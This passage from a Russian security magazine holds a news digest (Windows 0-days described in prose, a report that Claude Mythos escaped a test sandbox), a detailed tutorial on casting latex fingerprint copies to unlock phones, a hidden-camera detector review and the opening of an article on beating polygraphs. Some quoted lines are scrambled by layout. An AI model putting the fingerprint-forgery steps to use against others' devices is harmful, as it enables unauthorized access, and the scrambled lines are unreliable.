   для ядра Linux) он прокомментировал работу Sashiko — системы автоматического код‑ревью
   на базе ИИ, созданной инженерами Google. Торвальдс признал, что часть отчетов по‑прежнему
    оказывается→  В «чистымипоследнеегаллюцинациями»,время заметная доляно отметил:отчетов стала полностью валидной. Мы
         видели  по‑настоящему  блестящие  результаты —  глубокие,  тонкие  вещи,
          в которых ИИ оказывался на 100% прав. Так что любой, кто считает весь ИИ сло‐
          пом, просто отрицает текущее положение дел.





 ВЗЛОМ
 ШИФРОВАНИЯ
 BITCOIN И ETHEREUM
   Сразу два независимых исследования, опубликованных в апреле, показали,
   что квантовым компьютерам потребуется гораздо меньше ресурсов для взло‐
  ма криптографии на основе эллиптических кривых (ECC), чем считалось пару
   лет назад. Первая работа описывает подход с использованием нейтральных
   атомов в качестве кубитов, а во второй специалисты Google Quantum AI опи‐
   сывают оптимизированные квантовые схемы для взлома ECC.
      Авторы первого препринта (еще не прошедшего рецензирование) про‐
   демонстрировали, что квантовый компьютер менее чем с 30 тысячами
   физических кубитов способен взломать 256-битную ECC всего за десять
   дней.
    При этом накладные расходы оказались в 100 раз ниже прежних оценок.
   Ключевое преимущество такого подхода заключается в архитектуре на ней‐
   тральных атомах, захваченных «оптическими пинцетами». В отличие от сверх‐
   проводящих кубитов, которые расположены на 2D-сетке и взаимодействуют
   только с четырьмя соседями, нейтральные атомы могут свободно взаимодей‐
   ствовать друг с другом.
      Отмечается, что это значительно упрощает коррекцию ошибок и повышает
   отказоустойчивость. При этом другая команда исследователей ранее уже
   создала массивы оптических пинцетов для нейтральных атомов более чем
  из 6000 кубитов.





   Вторую работу опубликовали исследователи из компании Google. В этом слу‐
  чае эксперты спроектировали квантовые схемы для решения задачи дискрет‐
  ного логарифма на эллиптических кривых (ECDLP-256), которая применяется
  для подписи транзакций в Bitcoin, Ethereum и многих других блокчейнах.
      Одна из предложенных схем требует менее 1200 логических кубитов
  и 90 миллионов вентилей Тоффоли, вторая — менее 1450 логических кубитов
  и 70 миллионов вентилей. В  итоге, по оценкам авторов исследования,
  для атаки понадобится около 500 тысяч физических кубитов (вдвое меньше,
  чем в прошлом году предлагалось использовать для взлома 2048-битного
   RSA). Таким образом, в теории подобная атака займет менее девяти минут.
  По сравнению с прежними оценками это сокращение ресурсов примерно
   в 20 раз.
    При этом в Google отказались раскрывать подробности алгоритмических
   улучшений, стоящих за этим впечатляющим результатом. Вместо этого иссле‐
   дователи опубликовали zero-knowledge proof , которое математически под‐
   тверждает заявленные показатели, но не позволяет воспроизвести атаку.
      Сообщается, что такой подход был разработан совместно с правитель‐
  ством США, и авторы предлагают в будущем использовать его как модель
  для ответственного раскрытия подобных уязвимостей. Специалисты пояс‐
   нили:


         Прогресс в  квантовых  вычислениях  достиг  стадии,  когда  разумно
          прекратить публикацию деталей улучшенного квантового криптоана‐ «
          лиза, чтобы избежать злоупотреблений.                 »
   Такой  подход уже  вызвал  критику. К  примеру,  известный  криптограф
  и ИБ‑эксперт Мэтт Грин (Matt Green), профессор криптографии из Универ‐
   ситета Джонса Хопкинса, назвал опасения исследователей преувеличен‐
  ными. По его мнению, угроза, исходящая от алгоритма, которому нужен пока
  не существующий компьютер, — скорее PR-ход, чем реальная проблема.
    В свою очередь, Брайан Ламаккиа (Brian LaMacchia), криптограф, руково‐
   дивший постквантовым переходом в Microsoft, отметил, что в Google сос‐
   редоточились на угрозах для криптовалют, проигнорировав куда более мас‐
  совые системы — TLS, цифровые сертификаты, DocuSign и другие приложе‐
  ния на основе классической криптографии с открытым ключом.
      Следует подчеркнуть, что оба препринта пока не прошли рецензирование
  и до практической реализации описанных атак еще далеко, ведь пока под‐
  ходящих квантовых компьютеров попросту не существует.


  1967 ЛИЦЕНЗИЙ ОТОЗВАЛ РКН У ОПЕРАТОРОВ СВЯЗИ
   Роскомнадзор прекратил действие 1967 лицензий у 1025 операторов связи по всей России
   за непредоставление отчетов о деятельности.

  В общей сложности в России сейчас действуют 20 564 лицензии у 6980 операторов.


  В ведомстве уточнили, что в основном отзыв касается лицензий на отдельные виды услуг,
   которые операторы фактически не оказывают, а сама деятельность компаний продолжается
   по другим лицензиям без ограничений.





 0-DAY-ЭКСПЛОИТЫ
 НА GITHUB
  В  апреле  ИБ‑исследователь под псевдонимом  Chaotic  Eclipse  (он же
   Nightmare-Eclipse) развернул публичную кампанию против Microsoft,  пос‐
   ледовательно выкладывая на GitHub эксплоиты для непропатченных  уяз‐
   вимостей. Причиной стал конфликт специалиста с представителями Microsoft
   Security Response Center (MSRC), которые, по словам исследователя, угро‐
  жали ему.
     Первым в начале апреля на GitHub был опубликован эксплоит для еще
  не исправленной уязвимости BlueHammer. Эксплоит позволяет локально
  повысить привилегии до уровня SYSTEM и построен на базе TOCTOU (time-of-
  check to time-of-use) и path confusion.
     Уилл Дорманн (Will Dormann), ведущий аналитик по уязвимостям в ком‐
  пании  Tharros,  подтвердил  работоспособность  инструмента:  в  случае
  успешной  атаки злоумышленник получал  доступ  к базе SAM с хешами
  паролей локальных учетных записей, откуда мог продвинуться до уровня
  SYSTEM и полностью скомпрометировать целевую машину.
      Тогда Chaotic Eclipse не стал объяснять детали уязвимости, лишь сар‐
   кастически обратился к специалистам MSRC: «Вы, гении, сами разберетесь».
      Ближе к концу апреля исследователь вернулся еще с двумя 0-day-экспло‐
   итами — RedSun и UnDefend, на этот раз для Microsoft Defender.
     RedSun  эксплуатирует особенность облачной защиты Defender:  когда
   антивирус обнаруживает файл с облачным тегом, он перезаписывает его
   в исходное расположение. Эксплоит злоупотребляет этим поведением, выиг‐
   рывает состояние гонки при помощи oplock, а затем через directory junction
   перенаправляет перезапись на системный исполняемый файл, который
  потом запускается от имени SYSTEM. RedSun работает на полностью пропат‐
  ченных Windows 10, Windows 11 и Windows Server 2019.





  UnDefend действует иначе — провоцирует отказ в обслуживании и блокирует
   обновление баз Defender.
      После второй публикации Chaotic Eclipse наконец объяснил свои мотивы.
  Он заявил, что публикует эксплоиты в знак протеста против того, как в MSRC
   обращаются с ИБ‑специалистами, которые сообщают об уязвимостях. По его
   словам, представители MSRC угрожали ему и обещали «разрушить его
   жизнь»:


         Обычно  я  проходил бы весь  процесс,  умоляя их  исправить  баг,
        но если коротко — они вытерли мной пол и использовали все детские «
         приемы, какие только можно. В какой‑то момент я не мог понять,
       имею ли дело с огромной корпорацией или с кем‑то, кому просто
           нравится смотреть, как я страдаю.                 »
   Также исследователь утверждал, что в MSRC знали о готовящемся раскрытии
  информации о багах, но проигнорировали все предупреждения. Chaotic
   Eclipse пригрозил, что в будущем начнет публиковать эксплоиты для удален‐
  ного выполнения кода (RCE) после каждого патча Microsoft и намерен делать
   каждую следующую публикацию «еще более веселой».
    В рамках  апрельского «вторника обновлений» в  Microsoft  исправили
  BlueHammer (CVE-2026-33825), однако патчей для RedSun и UnDefend пока
   нет.
     Тем временем аналитики компании Huntress уже зафиксировали эксплу‐
   атацию всех трех уязвимостей в реальных атаках: хакеры начали применять
  BlueHammer с 10 апреля, а RedSun и UnDefend — с 16-го.


  ДУРОВ О СЛЕЖКЕ В ЕС





   Павел Дуров раскритиковал попытки ЕС усилить контроль над мессенджерами. По его словам,
   Евросоюз пытается оправдать расширение слежки (Chat Control) и цензуры (DSA) через под‐
    контрольные НКО и СМИ.
     В качестве примера Дуров привел организацию AI Forensics, которую он назвал «подрядчи‐
   ком Еврокомиссии на деньги Сороса», — та заявляла, что Telegram представляет проблему,
   потому→что Сомневаюсь,пользователи чтообсуждаюткто‑то ещеконтентвоспринимаетиз других соцсетейэти организациив приватныхвсерьез,группах:ведь
           большинство из них потеряли доверие людей еще в эпоху COVID. Но важно
           разоблачать все подобные попытки манипулирования общественным мнением,
          потому что они используются для того, чтобы отобрать у нас то немногое, что
           осталось от наших свобод.


   Позднее Дуров высказался и о взломе Национального агентства по защите документов Фран‐
   ции (ANTS), когда из правительственной базы утекли имена, адреса, email-адреса и номера
   телефонов→  Взломано19 миллионовфранцузскоечеловек: Agency for Secure Documents. Имена, адреса, email-
           адреса и номера телефонов 19 миллионов человек утекли из одной‑единствен‐
         ной государственной базы данных. Будущие утечки окажутся еще катастрофич‐
           нее, если французское правительство получит то, чего добивается: доступ
           к зашифрованным чатам и цифровым удостоверениям пользователей соцсетей.





 CLAUDE MYTHOS
 PREVIEW
  В апреле компания Anthropic представила Claude Mythos Preview — свою
  самую мощную ИИ‑модель, которую намеренно не стала выпускать в откры‐
  тый доступ.
     Как объясняли в компании, за несколько недель тестирования модель
   обнаружила тысячи 0-day-уязвимостей в популярных ОС и браузерах, а в ходе
   одного из внутренних тестов самостоятельно вырвалась из изолированного
   сендбокса и отправила письмо исследователю, который в этот момент обе‐
  дал в парке.
      Вместо публичного релиза Anthropic объявила о запуске инициативы
   Project Glasswing — закрытой программы, в рамках которой около 50 партне‐
  ров (среди них Amazon Web Services, Apple, Cisco, CrowdStrike, Google,
   Microsoft, Nvidia) получили доступ к модели для поиска проблем в собствен‐
  ных продуктах.
      Разработчики заявляют, что Mythos — это принципиально новый уровень
  и там, где Claude Opus 4.6 генерировал рабочий эксплоит примерно в 0%
   случаев, Mythos справляется в 72,4%.





   Сообщалось, что среди находок модели были баги возрастом от 10 до 27 лет:
  самый старый обнаружили и исправили в OpenBSD, 16-летний баг нашелся
   в FFmpeg (уязвимым код стал при рефакторинге в 2010 году, но с тех пор
  не попался ни одному фаззеру).
      Впрочем, проверить громкие заявления Anthropic о множестве уязвимос‐
   тей оказалось непросто. Специалист VulnCheck Патрик Гэррити  (Patrick
   Garrity) изучил реестр CVE и нашел лишь 40 записей, которые можно связать
  с исследователями Anthropic.
     Из них 28 багов пришлись на браузер Firefox (включая 12 критических уяз‐
   вимостей с оценкой 9,8 балла по шкале CVSS), девять — на wolfSSL, по одно‐
  му — на F5 NGINX Plus, FreeBSD и OpenSSL.
      Однако гарантировать, что все эти баги нашла именно Mythos, невоз‐
  можно. Полный публичный отчет Anthropic обещает выпустить примерно
   в июле 2026 года, и напрямую с Project Glasswing удалось связать лишь одну
  CVE — упомянутую выше 17-летнюю CVE-2026-4747 во FreeBSD.
      Отдельной историей, связанной с Mythos, стало попадание модели в руки
   посторонних. В тот же день, когда Anthropic анонсировала Mythos и Project
   Glasswing, небольшая группа энтузиастов из тематического Discord-канала
  сумела получить к модели доступ .
      Группа воспользовалась информацией из утечки ИИ‑стартапа Mercor,
  который работает с крупнейшими ИИ‑разработчиками: из слитых данных ста‐
  ли известны форматы URL, используемые Anthropic для своих моделей, что
   позволило попросту угадать адрес. Кроме того, один из участников группы
  работал  контрактником на  компанию, занимающуюся  оценкой моделей
   Anthropic, и имел легитимный доступ к части инфраструктуры.
      Группа пользовалась Mythos  около двух недель, намеренно  избегая
  ИБ‑промптов и ограничиваясь безобидными задачами вроде создания прос‐
   тых сайтов. Также сообщалось, что, помимо Mythos, энтузиасты получили
   доступ и к другим неанонсированным моделям Anthropic.
    В ответ на это в компании заявили, что расследуют инцидент, но пока
  не обнаружили признаков компрометации собственных систем, а проблема,
   судя по всему, ограничилась только средой подрядчика.


  50,9 BTC УКРАЛИ У ОПЕРАТОРА БИТКОИН-БАНКОМАТОВ
 В США
   Атакующие взломали корпоративную инфраструктуру Bitcoin Depot — крупнейшего оператора
   биткоин‑банкоматов  в США —  и  вывели  из  кошельков  компании  50,9  BTC  (около
  3 665 000 долларов США по курсу на момент атаки).

    Bitcoin Depot управляет сетью из более чем 25 000 устройств по всему миру с годовой выруч‐
   кой 615 000 000 долларов США .

   Компания подчеркивает, что инцидент затронул только корпоративную среду и не повлиял
   на клиентские данные и работу банкоматов.



  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
    Исследователь сообщил о серьезной уязвимости в VLESS-клиентах


  ФБР извлекло удаленные сообщения Signal из БД push-уведомлений iPhone


   Хакеры опубликовали похищенные у Rockstar Games данные


   СМИ: в России хотят убрать с рынка небольших операторов связи


   Android-малварь NoVoice заразила более 2,3 миллиона устройств


   Grinex заявила, что биржу атаковали западные спецслужбы


   Операторы подписали мораторий на расширение зарубежных каналов связи


    Антипираты закрыли платформу AnimePlay


   За незаконный майнинг предлагают ввести уголовную ответственность


  В сообществе полагают, что проект IPv8 создан с помощью ИИ
COVER STORY





Уверен,  ты  много  раз  разблокировал
устройства отпечатком пальца. А задумы‐
вался ли, насколько это надежный способ
сохранить свои секретики? Ни у кого же нет                                                                               Константин Шавков
                                                                                                  kosty_sh@mail.ruпапиллярного  узора, как у тебя, должно
быть очень надежно! Но, как оказалось,
обойти такую блокировку устройства не так
уж и сложно. А как именно, я тебе и расска‐
жу.


             INFO

                        Статья   подготовлена   на   основе   доклада
                       на ZeroNights 2025, а также проходившего там же
                            воркшопа.  Слайды  презентации  ты  найдешь
                        в Telegram-канале автора.


Будем экспериментировать со своим устройством, чтобы отработать тех‐
нологию, а все остальное оставим за скобками. Уверен, что способов добыть
отпечаток очень много, даже мой тренер придумал парочку довольно инте‐
ресных сценариев для Red Team.
  В конце статьи ты найдешь ссылки на исследования, которые можно объ‐
единить с искусственными отпечатками и открывать вообще всё, но теперь
давай приступим.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ЧТО НУЖНО ДЛЯ ВОСПРОИЗВЕДЕНИЯ ПАПИЛЛЯРНОГО УЗОРА

Выработанная мной технология подразумевает пять шагов:
 1. Получение изображения отпечатка.
 2. Генерация векторного изображения в Inkscape.
 3. Создание 3D-формы в OpenSCAD.
 4. Печать 3D-формы в Chitubox.
 5. Отливка латексом.

Не пугайся того, что тут много шагов, весь процесс занимает не более
получаса, если не считать время высыхания латекса. Уже во второй раз ты
сделаешь все очень быстро.
   Что понадобится для создания искусственной копии отпечатка:
 • набор для снятия отпечатка;
 • 3D-принтер;
 • жидкий латекс.





Все это продается на всем известных маркетплейсах или сайтах в сети.


ПОЛУЧАЕМ ИЗОБРАЖЕНИЕ ОТПЕЧАТКА

Здесь тебе выпадает возможность попробовать себя в роли детектива с нас‐
тоящими материалами: краской, порошком, кисточками и валиками.
  По запросу «дактилоскопический набор» поисковик выдаст тебе извес‐
тные торговые площадки. Стоимость такого набора начинается от 400 руб‐
лей. Рекомендую приобрести комплект с краской и валиками, а не порошком
и кисточкой, потому что им будет легче всего пользоваться.





Внутри коробки ты найдешь инструкцию по использованию:
 1. Наносишь краску на пластину (обычно в комплекте).
 2. Растираешь и наносишь на пальцы добровольца валиком.
 3. Отпечатываешь на бумагу.

Теперь у тебя есть отпечаток, который надо сфотографировать и сохранить
на компьютер, например под именем finger.jpg.





СОЗДАЕМ ВЕКТОРНОЕ ИЗОБРАЖЕНИЕ

Все делается парой кликов в опенсорсном векторном редакторе Inkscape .
   Запускаем Inkscape, нас встретит диалоговое окно. Выбирай Browse for
other files и нажимай Open. После этого откроется проводник и попросит най‐
ти фото, которое ты сделал ранее (finger.jpg).





Если вдруг появится какое‑то сообщение, можешь тоже спокойно нажать Оk.
   Теперь ты должен увидеть отпечаток в Inkscape. Для создания векторного
изображения нас интересует вкладка на верхней панели Path → Trace Bitmap.





Щелкнув по линии отпечатка, ты выберешь цвет для выделения, и сгенери‐
руется предпросмотр на боковой панели. Если тебе не нравится то, что
получается, можно подвигать ползунки параметров, но зачастую в этом нет
необходимости.





Жми Apply, а после удаляй фотографию с полотна. Останется только век‐
торное изображение.





Теперь осталось только экспортировать SVG через меню  File → Export.
Боковая панель сменится панелью экспорта, где тебе предстоит выбрать
формат файла. Нас интересует SVG. Укажи путь и нажми Export.





Чтобы OpenSCAD знал физические размеры отпечатка, надо внести их в SVG
текстовым редактором. Измерь отпечаток линейкой, открой SVG блокнотом
и вноси значение высоты (или ширины), как на рисунке ниже. Можно указать
только одно измерение, а второе удалить, пропорции изображения сохранят‐
ся.





СОЗДАНИЕ 3D-ФОРМЫ

Испугался? Не бойся, модель за нас сделает OpenSCAD Nightly ! Важно ска‐
чать версию из раздела Development Snapshots, потому что в ней есть фун‐
кция импорта SVG-файла.


        WWW

                       Скрипт Finger.scad



Нам понадобится подготовленный мной скрипт Finger.scad. Положи его в ту
же папку, что и Finger.svg. Весь процесс создания 3D-модели — это нажатие
трех кнопок в интерфейсе OpenSCAD: Preview (F5), Render (F6) и Export STL.
На картинке ниже красными цифрами показано, в каком порядке и что
нажимать.
   У тебя должна быть хоть какая‑то видеокарта, иначе процесс может
затянуться до тепловой смерти Вселенной. Если после превью или рендера
ты не видишь отпечаток, то это потому, что он на нижней грани прямоуголь‐
ника.





На выходе получаешь файл STL, который подходит для подготовки печати
на 3D-принтере.


ПЕЧАТАЕМ 3D-ФОРМЫ В CHITUBOX

Chitubox + STL = ♥!
 1. Открой STL, переверни форму отпечатком вверх и отзеркаль.
 2. Нажми Slice.
 3. Сохрани на флешку и отправляйся к принтеру. Печать займет около пят‐
   надцати минут.

Рекомендую предварительно подобрать параметры печати по тестовым
моделям , чтобы было несложно отделять модель от платформы и чтобы
не потерять детализацию.
   Можно добавить драфт под моделью. Так отделять будет проще незави‐
симо от настроек. Для своих экспериментов я использовал принтер Elegoo
Mars 3 Pro c разрешением экрана 4K, 727 DPI и высотой слоя 0,05 мм.
   Время засветки пяти начальных слоев — 18 с, далее 2 с.
   Через 15 мин у тебя появятся готовые формы для заливки латексом.





Наливай сверху латекс и жди, пока белизна пропадет и он станет почти проз‐
рачным. У меня это заняло около четырех часов.
   Аккуратно отделяй получившуюся пленку, и вуаля, искусственный отпе‐
чаток готов! Беги скорее проверять.





Чтобы латекс не потерял свои проводящие свойства и продолжал обма‐
нывать не только оптические, но и емкостные сенсоры, его нужно хранить
в воде. Для этого отлично подходят контейнеры для линз.


МЫСЛИ И ЗАКЛЮЧЕНИЕ

Хочется упомянуть исследования, которые могут дополнить или усовершенс‐
твовать процесс создания искусственных отпечатков.
   Научные работы в PDF:
 • DeepMasterPrints: Generating MasterPrints for Dictionary Attacks via Latent
   Variable Evolution
 • Universal Fingerprint Generation: Controllable Diffusion Model with Multimodal
   Conditions
 • BrutePrint: Expose Smartphone Fingerprint Authentication to Brute-force Attack
 • InfinityGauntlet: Brute-force Attack on Smartphone Fingerprint Authentication

Видео:
 • Доклад на DEF CON
 • Доклад на OFFZONE


        WWW

                           Также рекомендую глянуть список баз отпечатков
                       на GitHub.


Первое исследование — DeepMasterPrints. Ребята взяли датасеты отпечатков
и на их основе обучали нейросеть, а затем уже генерировали отпечатки, что‐
бы обходить СКУД. На изображении ниже слева отпечатки из датасета, спра‐
ва — отпечатки, которые были сгенерированы. В таблице проценты успешных
срабатываний при разных уровнях безопасности (False Match Rate).
   Думаю, в этом направлении есть куда стремиться, можно было бы сделать
набор «Мастер отпечатков», отлить из латекса и носить с собой для тес‐
тирования.





Второе исследование — перебор отпечатков на Android — представлено
в двух работах: BrutePrint и InfinityGauntlet. Для этого в обоих случаях к SPI-
интерфейсу сканера отпечатка подключалось устройство, которое посылало
словарь отпечатков и кликало на сенсор.





В работах рассказывается о создании словаря для перебора и о том, как это
возможно реализовать, несмотря на ограничение количества попыток. Огра‐
ничение обходится путем использования одного из двух подходов — CAMF
(Cancel-After-Match-Fail) или MAL (Match-After-Lock).
 • CAMF — отмена попытки, если отпечаток не подошел, — достигалась
   отправкой неверной контрольной суммы по SPI. Это приводит к ошибке,
   которая не увеличивает счетчик неудачных попыток;
 • MAL — продолжение перебора после временной или постоянной бло‐
   кировки устройства. В первом случае возможно разблокировать устрой‐
   ство подобранным отпечатком по истечении времени блокировки. Во вто‐
  ром — только после ввода ПИН‑кода или пароля.





А что, если это все объединить? Генерировать нейросеткой отпечаток,
посылать его по SPI на сенсор телефона, получать информацию о том, раз‐
блокировался он или нет, и продолжать обучать нейросетку? Таким образом
можно  автоматизировать  обучение  генеративной  нейросети,  используя
обратную связь от телефона.





Надеюсь, статья вдохновит продолжать эксперименты с биометрическими
СКУД и придумывать новые способы их обхода! © X
                   ← НАЧАЛО СТАТЬИCOVER STORY
       ОХОТА НА ЖУКА
     ИЩЕМ СКРЫТЫЕ КАМЕРЫ И ДРУГИЕ
            ШПИОНСКИЕ УСТРОЙСТВА




А вот магнитный датчик оставил исключительно приятные впечатления —
работает отлично на MagSafe и в коробке, вопросов к этому нет. Можно нас‐
троить  чувствительность. Подбирать угол для  стабильного  обнаружения
не нужно.


NEEKOMFORT Hidden Camera Detector





                          Детектор‑палка NEEKOMFORT

 • Цена: 30 долларов
 • Функции: радиодетектор, магнитный детектор, детектор скрытых камер,
   детектор инфракрасного излучения
 • Регулировки: чувствительность радиодетектора, чувствительность маг‐
   нитного детектора, режимы свечения светодиодов
 • Заявленный диапазон частот: 1 МГц — 12 ГГц

В описании сразу бросается в глаза заявленный диапазон рабочих частот:
от 1 МГц до 12 ГГц — это покруче, чем даже в хороших SDR! И это всего
за 30 долларов. А еще, в отличие от прошлых девайсов, присутствует виб‐
роотклик.
  В комплекте только само устройство и зарядный кабель. Довольно скудно,
но радует форма устройства, оно очень хорошо лежит в руке, и материал при‐
ятный.
   Первый тест, как обычно, с камерой Tapo. В этом детекторе нет никакого
фильтра, просто светит красный светодиод. Из‑за отсутствия фильтра на глаз
уловить блик от камеры очень тяжело. Также много паразитных бликов от дру‐
гих поверхностей из‑за расположения диода. Удобно? Нет. Зато светодиод
умеет мигать!
   Телефон занимает свое почетное место в коробке. У устройства несколь‐
ко уровней чувствительности, включаем максимальный, и... ничего. Телефон
сидит на Wi-Fi 5 ГГц, и это устройство вообще его не видит. Возможно, заяв‐
ленные диапазоны не покрывают 5 ГГц? Похоже на аккуратное накручивание
характеристик… Проверка на обычных 2,4 ГГц отработала отлично. В целом
в этом тесте устройство показало себя не очень.
  В устройстве также есть и магнитный детектор. На коробке от M8000 тоже
были маленькие магниты, посмотрим, как устройство их обнаружит.





                        Магнитный датчик в деле

На максимальной чувствительности и расстоянии 3 см магниты прекрасно
детектируются. Ну хоть в чем‑то производитель преуспел.
   Итого: магнитный детектор работает, красный свет без фильтра найти
тяжело, но тоже можно, а детектор радио хоть и покрывает впечатляющий
диапазон частот, но работает странно.


X13





                             Ноунейм‑Х13

 • Цена: 20 долларов
 • Функции:  радиодетектор, детектор скрытых камер, детектор инфрак‐
   расного излучения
 • Регулировки: чувствительность радиодетектора, режимы свечения све‐
   тодиодов
 • Заявленный диапазон частот: 1 МГц — 6,5 ГГц

Прибор довольно дешевый — стоит всего 20 долларов, а имеет все нужные
функции. Очень приятный корпус и размеры.
  Идем к нашей камере и проверяем оптическую составляющую. Красный
фильтр оказался чрезвычайно плохого качества, картинка через него плывет,
но хоть светодиоды светят хорошо. Камеру он видит, но не так четко, как наш
эталон М8000. Есть несколько режимов освещения. Фото не передает, нас‐
колько все плохо, но перейдем к следующим тестам.
   Телефон в коробке ему обнаружить не удалось. Да и в упор, даже на мак‐
симальной чувствительности, тоже. Как и прошлые дешевые варианты, детек‐
тирует он только маленький диапазон частот. Антенна тоже не очень.
  В целом можно взять такой шедевр китайской индустрии только из‑за
цены и положить на полочку. Искать им что‑то будет очень неудобно и крайне
малоэффективно.


NoName Professional-Grade Detector





                            Рисовый детектор

 • Цена: 10 долларов
 • Функции:  радиодетектор, детектор скрытых камер, детектор инфрак‐
   расного излучения
 • Регулировки: чувствительность радиодетектора, режимы свечения све‐
   тодиодов
 • Диапазон частот: не заявлен

Очень дешевый вариант примерно за десять баксов, но в карточке товара
заявлен как «детектор профессионального уровня». Выглядит он соответс‐
твенно цене, на ощупь тоже не очень. Фильтр отлетел куда‑то в сторону, ког‐
да я его просто открыл. Тестировать я его буду, только чтобы узнать, насколь‐
ко плохо может работать настолько дешевая поделка.
   Ожидаемо оптический тест полностью провален. Камеру видно плохо —
и то, только если смотреть прямо на нее в упор. Фильтр не мутный, но и
не кристально чистый.





Невероятно, но факт: детектор прошел тест «Телефон в коробке» на средней
чувствительности. Для поиска устройств с Wi-Fi он годится. Единственная
проблема — иногда реагирует на шумы Wi-Fi даже не от телефона, а от
соседских роутеров.


K18 Advanced Detector





                       K18 Advanced Detector

 • Цена: 100 долларов
 • Функции: радиодетектор, детектор скрытых камер, магнитный детектор
 • Регулировки: чувствительность радиодетектора, режимы свечения све‐
   тодиодов
 • Диапазон частот: не заявлен

Очень похож на M8000 по форме и внешнему виду, но имеет встроенную
оптику. В руке сидит хорошо и имеет настройки. Цена тоже серьезная —
начинается от 100 долларов.
   Качество тут видно сразу. Оптика, например, имеет хороший фильтр
и множество ярких светодиодов. Камеру находит без проблем под разными
углами. Но дальше начинает казаться, что из действительно качественного
тут только корпус.





                              Тест радио

Тест на телефон в коробке пройден с легкостью, даже слишком легко: детек‐
тор чересчур чувствительный, даже с учетом того, что его можно регули‐
ровать. Выставить чувствительность так, чтобы он не ловил помехи, но при
этом находил источник сигнала, непросто. Иногда действительно сложно
понять, что именно ты нашел, — помеху или устройство.
   Магнитный детектор у этой модели тоже странный: работает  только
под определенным углом и на малом расстоянии, пользоваться им будет
неудобно. Также у него нет регулировки чувствительности.
  В итоге не очень понятно, за что я платил. Даже у безымянного Detector
Safety Protection за почти втрое меньшую цену качество оптики не хуже, а за
остальное доплачивать смысла нет.


Kaxyuya K-007





                             Kaxyuya K-007

 • Цена: 130 долларов
 • Функции: радиодетектор, детектор скрытых камер, магнитный детектор
 • Регулировки: чувствительность радиодетектора, чувствительность маг‐
   нитного детектора, режимы свечения светодиодов, оповещение о зем‐
   летрясении, сторож
 • Заявленный диапазон частот: 1 МГц — 2,8 ГГц

Первая особенность, бросающаяся в глаза, — устройство очень большое,
на вид похоже на металлоискатели охранников. Цена — 130 долларов. Но все
сделано из самого дешевого пластика, какой только можно найти в китайском
подвале. Детектор для камер выполнен отдельно. Зато детектор камер имеет
функцию фонарика и… оповещения о землетрясениях!
  В отличие от корпуса, оптика на уровне: фильтр чистый, камеру находит
без проблем, светодиодов достаточно, чтобы обнаруживать скрытые камеры.
  А вот телефон в коробке найти будет заведомо сложно. Дело в том, что
заявленный диапазон частот — 1 МГц — 2,8 ГГц, так что мой Wi-Fi 5 ГГц сразу
отпадает. Это подтверждает и тест. Зато на обычную сотовую связь девайс
реагирует.
   Тест с магнитом на коробке пройден успешно, детектирование происхо‐
дит на расстоянии 1–2 см, как и у других похожих моделей. Главный минус
в том, что тут все антенны встроены внутрь, это сильно усложняет исполь‐
зование: придется буквально тыкать огромным корпусом везде в помещении.
Получается, что магнитный детектор как бы есть, но воспользоваться им тол‐
ком нельзя.


ВЫВОДЫ

Хотелось бы сказать что‑то неочевидное, но, увы, бабло побеждает зло:
более дорогие устройства работают лучше.
   Победителем по соотношению цена/качество я бы назвал JAXTIN G66
PRO. По уровню он как M8000, но дешевле. Если же смотреть качество
без учета цены, то побеждает JMDHKK M8000. Хорошо в нем всё, но он нам‐
ного дороже конкурентов.
   Эти два устройства лучшие и по оптике, и по радиодетектору, и по маг‐
нитному  датчику. Среди бюджетных можно отметить X19, NEEKOMFORT
и NoName, но, если у тебя нет денег на нормальный детектор, скорее всего,
следить за тобой такими жучками никто и не будет. © X
COVER STORY





Ты наверняка слышал о детекторах лжи
и даже, возможно, видел их в фильмах.
Можно ли  противодействовать  проверке
на полиграфе, как обмануть это устройство                                                                                Антон Бочкарев
                                                                                      Основатель 3side.org,и его оператора? В этой статье подробно                                                                                             пентестер, редтимер,
обсудим, какие методы реально работают,         социальный инженер                                                                                         Antxakk@gmail.com
а какие лучше  никогда не использовать
на практике.


Любая защита требует проверки, но о проекте Red Team полиграфа я услы‐
шал впервые. Не уверен, что подобным и вовсе кто‑либо занимался до меня!
Формально работа называлась «анализ качества проведения полиграфной
проверки черным ящиком». Иными словами, проверь, как работает полиграф
в компании, раскусит ли полиграфолог «двойную игру», и напиши об этом
подробный отчет.
  Для выполнения подобного проекта нужен очень специфический набор
талантов и знаний:
 • мышление пентестера — чтобы в целом такое придумать;
 • навыки социальной инженерии — для искусного притворства;
 • хорошая теоретическая база и знание нюансов работы полиграфолога/
   верификатора.

Мне повезло, в 2016–2017 годах я изучал детекторы лжи на протяжении
более полугода, даже получил корочку государственного образца, поэтому
рискнул взяться за этот проект.
  В этой статье я расскажу тебе:
 • о базе, на основании которой работает полиграфолог;
 • об особенностях работы полиграфа и о том, что он показывает на самом
   деле;
 • об архитектуре правильной полиграфной проверки;
 • об ограничениях при проверках и о том, как их правильно эксплуатировать;
 • об уязвимостях полиграфолога — основного и самого слабого звена этой
   системы.


             INFO

                      Это вторая статья об эксплоитах человеческого
                           мозга , но уже в ином контексте. Если ты по‑преж‐
                      нему считаешь, что психология не наука, то эта
                         статья не для тебя.
                             Автор опирается исключительно на принятые
                      и проверенные в научном сообществе теории,
                           исследования и публикации. А также анализирует
                           собственный опыт социальной инженерии через
                          призму подобных теорий.



ЧТО ТАКОЕ ЭТОТ ВАШ ПОЛИГРАФ НА САМОМ ДЕЛЕ?

Полиграф (полис + граф — многописец) — техническое устройство, которое
любят называть детектором лжи. Но ложь он не детектирует. Так же как и МРТ
не детектор онкологических заболеваний. Может ли МРТ определить рак?
Конечно, нет: МРТ лишь инструмент, позволяющий заметить опухоль при его
правильном использовании. А уж рак ли это, артефакт исследования или доб‐
рокачественное образование, определяет врач. И он использует для этого
множество источников данных: от анализов крови до биопсии тканей.





                        Полиграф не детектирует ложь

Полиграф работает по схожему принципу. Этот прибор — многоканальный
осциллограф, который  фиксирует  динамику  твоего  состояния: дыхание,
пульс, давление и сопротивление кожи. Он лишь фиксирует множество
параметров и их изменения. Железке неведомо, почему происходят изме‐
нения, какими стимулами это вызвано. Интерпретирует результаты только
человек.
